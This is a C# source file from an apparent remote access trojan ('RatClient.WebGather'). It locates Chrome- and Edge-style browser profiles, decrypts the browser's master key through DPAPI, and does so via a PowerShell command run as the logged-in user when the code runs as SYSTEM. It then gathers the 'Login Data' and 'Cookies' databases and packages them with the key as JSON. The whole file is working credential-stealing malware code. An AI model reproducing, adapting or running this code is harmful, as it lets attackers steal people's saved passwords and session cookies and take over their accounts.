using System;
using System.IO;
using System.Runtime.Serialization.Json;
using System.Collections.Generic;
using System.Security.Cryptography;


namespace RatClient.WebGather
{
    class Passwords
    {
        static private string RegGcm(string encryptedKey)
        {
            byte[] encryptedKeyBytes = Convert.FromBase64String(encryptedKey);
            byte[] keyBytesToDecrypt = new byte[encryptedKeyBytes.Length - 5];
            Array.Copy(encryptedKeyBytes, 5, keyBytesToDecrypt, 0, keyBytesToDecrypt.Length);
            byte[] decryptedKey = ProtectedData.Unprotect(keyBytesToDecrypt, null, DataProtectionScope.LocalMachine);

            return Convert.ToBase64String(decryptedKey);

        }
        static private string GetGcmKey(string type)
        {
            string path = Path.Combine(WebInfo.paths[type], "Local State");
            byte[] content;
            if (path == null)
            {
                return null;
            }
            try
            {
               content = GetFileContent(path);
            }
            catch
            {
                return "Error Reading file key";
            }
            
            string encryptedKey;
            using (var stream = new MemoryStream(content))
            {
                var serializer = new DataContractJsonSerializer(typeof(Content));
                var deserializedContent = (Content)serializer.ReadObject(stream);
                encryptedKey = deserializedContent.OsCrypt.EncryptedKey;

            }
            if (encryptedKey == null)
            {
                return null;
            }
            if (!Tools.imSystemUser())
            {
                return RegGcm(encryptedKey);
            }
            string argument = $" -NoLogo -NoProfile -Command $GCKEY=[System.Convert]::FromBase64String('{encryptedKey}'); " +
                              "Add-Type -AssemblyName System.Security; " +
                              "$comm='[System.Security.Cryptography.ProtectedData]::Unprotect($GCKEY[5..($GCKEY.Length-1)], $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)'; " +
                              "$out=(Invoke-Expression -Command $comm); " +
                              "[System.Convert]::ToBase64String($out)";
            return System.Text.Encoding.ASCII.GetString(Tools.RunAsCurrentUser("powershell", argument)).Trim();
        }

        private static string[] GetProfiles(string type)
        {
            string path = WebInfo.paths[type];
            List<string> result = new List<string>();
            if (type == "chrome" || type == "edge")
            {
                result.Add(Path.Combine(path, "Default"));
            }
            foreach (string i in Directory.GetDirectories(path, "Profile*"))
            {
                result.Add(i); 
            }
            return result.ToArray();
        }

        private static byte[] GetFileContent(string path)
        {
            byte[] res;
            using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                byte[] fileBytes = new byte[fs.Length];
                fs.Read(fileBytes, 0, (int)fs.Length);
                res = fileBytes;
            }
            return res;
        }

        public static byte[] Gather(string web, string type)
        {
            List<UserDataBase> result = new List<UserDataBase>();
            string GcKey = GetGcmKey(web);
            string path;
            foreach (string i in GetProfiles(web))
            {
                if (type == "Passwords")
                {
                     path = Path.Combine(i, "Login Data");
                }
                else
                {
                    path = Path.Combine(i, "Cookies");
                }
                
                if (!File.Exists(path))
                {
                    continue;
                }
                string db = Convert.ToBase64String(GetFileContent(path));
                if (db == null)
                {
                    continue;
                }
                result.Add(new UserDataBase(Path.GetFileNameWithoutExtension(i), db));
            }
            return Tools.SerializeToJson(new FullResult(GcKey, result.ToArray()));
        }
    }
}
